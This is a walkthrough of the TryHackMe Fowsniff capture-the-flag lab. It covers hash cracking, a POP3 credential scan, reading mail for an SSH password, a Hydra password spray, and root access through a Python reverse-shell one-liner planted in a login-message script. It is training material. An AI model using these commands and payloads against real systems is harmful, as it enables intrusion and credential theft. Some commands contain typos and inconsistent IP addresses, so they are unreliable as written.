# TryHackMe - Fowsniff CTF Walkthrough

## 🛠 Setup

Set an environment variable for the IP to simplify commands:

```bash
export IP=10.10.242.74
```

---

## 📌 Task 1: Initial Recon

### 🔍 Nmap Scan

```bash
nmap -sC -sV -oN nmap/initial $IP
```

**Results:**

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-20 22:41 EDT
Nmap scan report for 10.10.242.74
Host is up (0.15s latency).
Not shown: 996 closed tcp ports (reset)
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 90:35:66:f4:c6:d2:95:12:1b:e8:cd:de:aa:4e:03:23 (RSA)                               
|   256 53:9d:23:67:34:cf:0a:d5:5a:9a:11:74:bd:fd:de:71 (ECDSA)                              
|_  256 a2:8f:db:ae:9e:3d:c9:e6:a9:ca:03:b1:d7:1b:66:83 (ED25519)                            
80/tcp  open  http    Apache httpd 2.4.18 ((Ubuntu))                                         
| http-robots.txt: 1 disallowed entry                                                        
|_/                                                                                          
|_http-title: Fowsniff Corp - Delivering Solutions                                           
|_http-server-header: Apache/2.4.18 (Ubuntu)                                                 
110/tcp open  pop3    Dovecot pop3d                                                          
|_pop3-capabilities: CAPA PIPELINING SASL(PLAIN) TOP USER AUTH-RESP-CODE UIDL RESP-CODES     
143/tcp open  imap    Dovecot imapd                                                          
|_imap-capabilities: listed Pre-login ID have post-login OK ENABLE more LITERAL+ capabilities LOGIN-REFERRALS SASL-IR AUTH=PLAINA0001 IMAP4rev1 IDLE                                      
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel           
```

- Website mentions Twitter handle: `@fowsniffcorp`
- The Twitter page is down, but TryHackMe provides a backup credential dump.

## 🔐 Cracking Password Hashes

### 🧾 Hash Dump (from backup link):
```
mauer@fowsniff:8a28a94a588a95b80163709ab4313aa4
mustikka@fowsniff:ae1644dac5b77c0cf51e0d26ad6d7e56
tegel@fowsniff:1dc352435fecca338acfd4be10984009
baksteen@fowsniff:19f5af754c31f1e2651edde9250d69bb
seina@fowsniff:90dc16d47114aa13671c697fd506cf26
stone@fowsniff:a92b8a29ef1183192e3d35187e0cfabd
mursten@fowsniff:0e9588cb62f4b6f27e33d449e2ba0b3b
parede@fowsniff:4d6e42f56e127803285a0a7649b5ab11
sciana@fowsniff:f7fd98d380735e859f8b2ffbbede5a7e
```

### 🔓 Crack Using John the Ripper:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt passwords -format=Raw-md5
```

**Cracked Results:**

```
scoobydoo2       (seina@fowsniff)     
orlando12        (parede@fowsniff)     
apples01         (tegel@fowsniff)     
skyler22         (baksteen@fowsniff)     
mailcall         (mauer@fowsniff)     
07011972         (sciana@fowsniff)     
carp4ever        (mursten@fowsniff)     
bilbo101         (mustikka@fowsniff)
```

SSH login attempts with these passwords failed.

## ✉️ Exploring POP3

### 🛰 Nmap POP3 Capability Check:

```bash
nmap -sV --script=pop3-capabilities -p 110 10.10.242.74
```

**Capabilities:**

_pop3-capabilities: USER SASL(PLAIN) PIPELINING AUTH-RESP-CODE RESP-CODES TOP UIDL CAPA

### 🛰 using metasploit:

First we need to create two files, one that has the user names and the other that has the passwords. Then
 ```bash
mfsconsole
set pops_login
set RHOST 10.10.242.74
set user_file user.txt
set pass_file pass.txt
run
```

Bam! seina works!

### 📬 Access with Telnet:

Q. Looking through her emails, what was a temporary password set for her?
A. S1ck3nBluff+secureshell

```bash
telnet $IP 110
```

Then:

```
USER seina@fowsniff
PASS scoobydoo2
LIST
RETR 1
RETR 2
```
### ✉️ Email 1 (From `stone@fowsniff`):
```
Return-Path: <stone@fowsniff>
X-Original-To: seina@fowsniff
Delivered-To: seina@fowsniff
Received: by fowsniff (Postfix, from userid 1000)
        id 0FA3916A; Tue, 13 Mar 2018 14:51:07 -0400 (EDT)
To: baksteen@fowsniff, mauer@fowsniff, mursten@fowsniff,
    mustikka@fowsniff, parede@fowsniff, sciana@fowsniff, seina@fowsniff,
    tegel@fowsniff
Subject: URGENT! Security EVENT!
Message-Id: <20180313185107.0FA3916A@fowsniff>
Date: Tue, 13 Mar 2018 14:51:07 -0400 (EDT)
From: stone@fowsniff (stone)

Dear All,

A few days ago, a malicious actor was able to gain entry to
our internal email systems. The attacker was able to exploit
incorrectly filtered escape characters within our SQL database
to access our login credentials. Both the SQL and authentication
system used legacy methods that had not been updated in some time.

We have been instructed to perform a complete internal system
overhaul. While the main systems are "in the shop," we have
moved to this isolated, temporary server that has minimal
functionality.

This server is capable of sending and receiving emails, but only
locally. That means you can only send emails to other users, not
to the world wide web. You can, however, access this system via 
the SSH protocol.

The temporary password for SSH is "S1ck3nBluff+secureshell"

You MUST change this password as soon as possible, and you will do so under my
guidance. I saw the leak the attacker posted online, and I must say that your
passwords were not very secure.

Come see me in my office at your earliest convenience and we'll set it up.

Thanks,
A.J Stone
```
### ✉️ Email 2 (From `baksteen@fowsniff`):
```
Return-Path: <baksteen@fowsniff>
X-Original-To: seina@fowsniff
Delivered-To: seina@fowsniff
Received: by fowsniff (Postfix, from userid 1004)
        id 101CA1AC2; Tue, 13 Mar 2018 14:54:05 -0400 (EDT)
To: seina@fowsniff
Subject: You missed out!
Message-Id: <20180313185405.101CA1AC2@fowsniff>
Date: Tue, 13 Mar 2018 14:54:05 -0400 (EDT)
From: baksteen@fowsniff

Devin,

You should have seen the brass lay into AJ today!
We are going to be talking about this one for a looooong time hahaha.
Who knew the regional manager had been in the navy? She was swearing like a sailor!

I don't know what kind of pneumonia or something you brought back with
you from your camping trip, but I think I'm coming down with it myself.
How long have you been gone - a week?
Next time you're going to get sick and miss the managerial blowout of the century,
at least keep it to yourself!

I'm going to head home early and eat some chicken soup. 
I think I just got an email from Stone, too, but it's probably just some
"Let me explain the tone of my meeting with management" face-saving mail.
I'll read it when I get back.

Feel better,

Skyler

PS: Make sure you change your email password. 
AJ had been telling us to do that right before Captain Profanity showed up.
```

## 🔐 SSH Login (via Hydra)

In the email, who send it? Using the password from the previous question and the senders username, connect to the machine using SSH.
Use Hydra to brute-force usernames with known password:

```shell
hydra -p S1ck3nBluff+secureshell -L /home/username/Documents/THM/Fowsniff_CTF/users ssh://10.10.242.74
```

**Result:**

```
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-06-21 08:52:41
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 9 tasks per 1 server, overall 9 tasks, 9 login tries (l:9/p:1), ~1 try per task
[DATA] attacking ssh://10.10.242.74:22/
[22][ssh] host: 10.10.238.253   login: baksteen   password: S1ck3nBluff+secureshell
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-06-21 08:52:45
```

```bash
groups
users baksteen
```

Now lets looks for files

```bash
find / -type f -name *.sh -group users 2>/dev/null
```

**Found:**

```
/opt/cube/cube.sh
```

If you check /etc/update-motd.d/00-header you'll see that this invoked the cude.sh. Let's nano cube.sh and add the reverse shell TRH gave us, replacing IP for our IP address.

## 🐚 Add Reverse Shell Payload

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.242.74",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### 🛡 Start Listener:

'''bash
nc -nlvp 1234
```
### 🔁 Re-login over SSH

```bash
ssh baksteen@10.10.242.74
```

When the login message executes `cube.sh`, the reverse shell connects back.

---

## 🎉 Root Access Achieved!
